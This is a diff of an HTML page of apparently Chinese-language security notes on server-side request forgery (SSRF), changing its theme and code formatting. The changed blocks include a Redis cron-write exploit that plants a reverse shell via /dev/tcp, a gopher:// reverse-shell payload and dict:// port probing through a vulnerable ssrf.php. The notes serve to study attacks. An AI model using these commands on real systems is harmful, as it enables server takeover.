@@ -1,14 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-12-31 Sat 00:22 -->
+<!-- 2023-02-02 Thu 21:55 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SSRF</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
-<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
+
+                     <!--
+                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                      <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
+                     -->
+                     <!--
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     -->
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
 <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
         displayAlign: "center",
@@ -35,7 +57,27 @@
 <div id="content" class="content">
 <header>
 <h1 class="title">SSRF</h1>
-</header>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orga539d7c">服务器端请求伪造</a></li>
+<li><a href="#ID-ee36975c-00cc-43e0-b777-93ce7df935e2">存在 SSRF 隐患的 PHP 函数</a>
+<ul>
+<li><a href="#org919a30a">攻击 Redis </a></li>
+</ul>
+</li>
+<li><a href="#org0ca2a70">SSRF 漏洞</a>
+<ul>
+<li><a href="#ID-9d72a111-0aa4-4f3b-948c-b9681c8367d6">Weblogic CVE-2014-4210 </a></li>
+<li><a href="#org60c5144">Discuz 3.4X SSRF</a></li>
+</ul>
+</li>
+<li><a href="#orgedb177f">绕过 URL 白名单或禁内网 IP 地址</a></li>
+</ul>
+</div>
+</nav>
+
 <div id="outline-container-orga539d7c" class="outline-2">
 <h2 id="orga539d7c">服务器端请求伪造</h2>
 <div class="outline-text-2" id="text-orga539d7c">
@@ -145,16 +187,16 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 </pre>
 </div>
 <div class="org-src-container">
-<pre class="src src-html"><span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>post.php<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span>?php
+<pre class="src src-html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;post.php&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;?php
     echo $_REQUEST[cmd];
-    ?<span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
-<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+    ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </pre>
 </div>
 
@@ -162,7 +204,7 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 <a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> 探测端口：
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
+<pre class="src src-bash">curl -v -H 'host:one.php.local' 'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'
 </pre>
 </div>
 <p>
@@ -174,12 +216,12 @@ Invalid SSH identification string.
 exp(linux):
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006FE0;">echo</span> <span style="color: #D0372D;">-e</span> <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span><span style="color: #0000FF;">|</span><span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> <span style="color: #D0372D;">-x</span> set <span style="color: #D0372D;">1</span>
-<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dir /var/spool/cron/
-<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dbfilename root
-<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> save
-<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> quit
-<span style="color: #006DAF;">bash</span> shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
+<pre class="src src-bash">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/
+redis-cli -h $1 -p $2 config set dbfilename root
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+bash shell.sh 127.0.0.1 6379
 </pre>
 </div>
 
@@ -195,7 +237,7 @@ exp(linux):
 再利用 <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> 协议 payload<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> 反弹 shell:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host: one.php.local'</span>
+<pre class="src src-bash">curl -v 'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...' -H 'host: one.php.local'
 </pre>
 </div>
 </div>
@@ -257,7 +299,13 @@ gopher payload 编码：<a href="https://github.com/firebroo/sec_tools/tree/mast
 </div>
 </div></div>
 <div id="postamble" class="status">
-<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+
+                     Theme
+                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow/readtheorg</a>
+                     by
+                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
+                     <br>
+                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
 </body>
 </html>
